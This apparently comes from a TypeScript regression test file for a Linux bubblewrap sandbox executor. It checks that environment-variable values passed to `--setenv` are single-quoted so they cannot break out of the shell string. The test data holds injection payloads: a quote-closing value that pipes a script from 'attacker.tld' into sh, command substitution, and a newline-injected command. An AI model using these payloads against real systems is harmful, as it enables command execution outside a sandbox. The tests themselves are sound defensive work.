/**
 * Shell-injection regression for bwrap `--setenv` VALUES (issue #2236 security
 * review of PR #2261, MEDIUM-1).
 *
 * `wrapCommand` returns `${binary} ${args.join(' ')}` — a SHELL STRING that the
 * caller hands to a shell tool. Every other interpolated value in that string
 * (scope paths, temp dir, the wrapped command) is single-quoted through
 * `shellEscape`. The `--setenv` VALUE was the one exception.
 *
 * The in-code comment justifying that read "bwrap passes these directly to
 * execve — values are NOT shell-interpreted". That is true OF BWRAP and
 * irrelevant here: the outer shell parses the string FIRST, long before bwrap
 * is executed. An unquoted value could therefore close the argument and run
 * arbitrary commands OUTSIDE the sandbox — precisely what the sandbox exists to
 * prevent.
 *
 * Reachability at the time of writing is closed (`tool-before.ts` only passes
 * `envOverrides` for `mechanism === 'sandbox-exec'`, so bwrap always receives
 * `undefined`), but `SandboxExecutor.wrapCommand` accepts `envOverrides` for
 * EVERY executor, so nothing type-level stops a future caller. These tests pin
 * the escaping so it cannot regress into reachability.
 *
 * The assertions are about the SHELL-STRING SHAPE, not about running anything:
 * a metacharacter must never appear outside a single-quoted region.
 */

import { afterEach, describe, expect, test } from 'bun:test';
import {
	_internals,
	BubblewrapSandboxExecutor,
} from '../../../src/sandbox/linux/bubblewrap-executor';

/**
 * The probe is forced through the module's own `_internals` seam, NOT through
 * `mock.module`.
 *
 * `mock.module` registers PROCESS-WIDE and is **not** undone by
 * `mock.restore()`, so a `probeBwrap: () => true` module stub leaks into every
 * later file in a shared-process run. Measured: it broke linux.test.ts's
 * "returns false on Windows (bwrap is Linux-only)", which asserts the REAL
 * probe.
 *
 * NOTE ON CI: no CI job would have caught this. Both the `unit` job and the
 * merge-queue `coverage` gate run ONE FILE PER PROCESS
 * (`scripts/ci/run-coverage-gate.sh:53` loops and invokes
 * `bun test --isolate` per file, per issue #1712). What contamination breaks is
 * a plain local `bun test a.test.ts b.test.ts` — which developers run
 * constantly — so the seam matters for the humans, not for the build.
 *
 * The seam is per-module and genuinely restorable, so the original is captured
 * once here and put back after every test.
 */
const originalProbeBwrap = _internals.probeBwrap;

afterEach(() => {
	_internals.probeBwrap = originalProbeBwrap;
});

/**
 * Returns the substring of `wrapped` that follows `--setenv <key> `, up to the
 * next ` --`. That is the region the outer shell parses as this value.
 */
function setenvRegion(wrapped: string, key: string): string {
	const marker = `--setenv ${key} `;
	const start = wrapped.indexOf(marker);
	expect(
		start,
		`--setenv ${key} must be present; without it every assertion below is vacuous`,
	).toBeGreaterThanOrEqual(0);
	const rest = wrapped.slice(start + marker.length);
	const end = rest.indexOf(' --');
	return end === -1 ? rest : rest.slice(0, end);
}

function makeExecutor(): BubblewrapSandboxExecutor {
	// The constructor calls `_internals.probeBwrap()`, so forcing it here is
	// enough to get a wrapping (non-passthrough) executor on any host.
	_internals.probeBwrap = () => true;
	return new BubblewrapSandboxExecutor(['/scope/a'], '/tmp');
}

describe('bwrap --setenv value shell-injection containment (PR #2261 MEDIUM-1)', () => {
	test('a value that tries to close the quote and chain a command stays inert data', () => {
		const executor = makeExecutor();
		// The classic break-out: end the quoted region, run something, reopen.
		const payload = "x'; curl attacker.tld/p.sh | sh; echo '";
		const wrapped = executor.wrapCommand('echo hello', [], undefined, {
			EVIL: payload,
		});

		// `shellEscape` turns each `'` into `'\''`, so the payload's own quotes
		// can never terminate the region the value occupies.
		expect(wrapped).not.toContain("--setenv EVIL x'; curl");
		expect(wrapped).toContain("'\\''");

		// The attacker's command text may appear (as data), but never as a
		// standalone shell word introduced by an unescaped separator.
		const region = setenvRegion(wrapped, 'EVIL');
		expect(region.startsWith("'")).toBe(true);
		expect(region.endsWith("'")).toBe(true);
	});

	test('command substitution and backticks are not left bare', () => {
		const executor = makeExecutor();
		const wrapped = executor.wrapCommand('echo hello', [], undefined, {
			SUB: '$(id)`whoami`',
		});

		// Single quotes suppress both forms; the value must sit inside them.
		const region = setenvRegion(wrapped, 'SUB');
		expect(region).toBe("'$(id)`whoami`'");
	});

	test('a value containing spaces reaches bwrap as ONE argument', () => {
		const executor = makeExecutor();
		const wrapped = executor.wrapCommand('echo hello', [], undefined, {
			SPACED: 'hello world',
		});

		// This is a correctness bug as much as a security one: unquoted, the
		// outer shell splits `hello world` into two words, so bwrap receives the
		// value truncated to `hello` plus a stray `world` argument.
		expect(setenvRegion(wrapped, 'SPACED')).toBe("'hello world'");
	});

	test('a newline in a value cannot start a new shell command', () => {
		const executor = makeExecutor();
		const wrapped = executor.wrapCommand('echo hello', [], undefined, {
			NL: 'a\ntouch /tmp/PWN',
		});

		// A raw newline outside quotes is a command separator in sh.
		const region = setenvRegion(wrapped, 'NL');
		expect(region.startsWith("'")).toBe(true);
		expect(wrapped).not.toContain('\ntouch /tmp/PWN --');
	});

	test('the key is still rejected on shape, so quoting is not load-bearing for it', () => {
		const executor = makeExecutor();
		const wrapped = executor.wrapCommand('echo hello', [], undefined, {
			'BAD;KEY': 'x',
		});

		// `isValidEnvKey` constrains keys to /^[a-zA-Z_][a-zA-Z0-9_]*$/, which is
		// shell-inert — which is why only the VALUE needed quoting.
		expect(wrapped).not.toContain('BAD;KEY');
		expect(wrapped).not.toContain('setenv');
	});
});
